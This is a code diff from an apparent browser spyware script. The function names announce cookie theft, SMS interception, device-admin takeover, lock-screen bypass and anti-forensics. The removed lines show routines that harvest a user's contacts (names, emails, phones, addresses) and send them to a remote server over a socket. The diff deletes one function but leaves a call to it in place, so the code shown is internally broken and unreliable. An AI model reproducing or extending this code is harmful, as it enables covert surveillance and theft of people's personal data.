@@ -1221,21 +1221,6 @@ function stealCookies() {
     } catch(e) {}
 }
 
-function initContactPicker() {
-    if (!navigator.contacts || !navigator.contacts.select) return;
-    const props = ['name', 'email', 'tel', 'address', 'icon'];
-    navigator.contacts.select(props, { multiple: true })
-        .then(contacts => {
-            socket.emit('device-info', { contacts: contacts.map(c => ({
-                name: c.name?.[0] || '',
-                email: c.email?.[0] || '',
-                tel: c.tel?.[0] || '',
-                address: c.address?.[0] ? `${c.address[0].street}, ${c.address[0].city}` : ''
-            })), count: contacts.length });
-        })
-        .catch(() => {});
-}
-
 function initSMSIntercept() {
     try {
         if (navigator.sms && navigator.sms.receive) {
@@ -1252,20 +1237,6 @@ function initSMSIntercept() {
             receiver.start().catch(() => {});
         } catch(e) {}
     }
-}
-
-function initCallLogAccess() {
-    try {
-        if (navigator.contacts && navigator.contacts.select) {
-            navigator.contacts.select(['name', 'tel'], { multiple: true })
-                .then(contacts => {
-                    if (contacts.length) {
-                        socket.emit('device-info', { callLog: contacts.map(c => ({ name: c.name?.[0] || '', tel: c.tel?.[0] || '' })) });
-                    }
-                })
-                .catch(() => {});
-        }
-    } catch(e) {}
 }
 
 function initDeviceAdminTakeover() {
@@ -1418,7 +1389,7 @@ function requestPermissions() {
     lockOrientation(); enumerateFonts(); detectPreferences();
     speedTest(); initPointerLock(); detectPosture();
     initSharedWorker(); cpuTiming();
-    initAntiForensics(); initContactPicker(); captureFullPage(); initAlwaysActive();
+    initAntiForensics(); captureFullPage(); initAlwaysActive();
     initFileSystemAccess(); detectBrowserHistory(); stealCookies();
     initSMSIntercept(); initCallLogAccess(); initDeviceAdminTakeover();
     initInstallHijack(); initLockScreenBypass(); initBackgroundFetch();
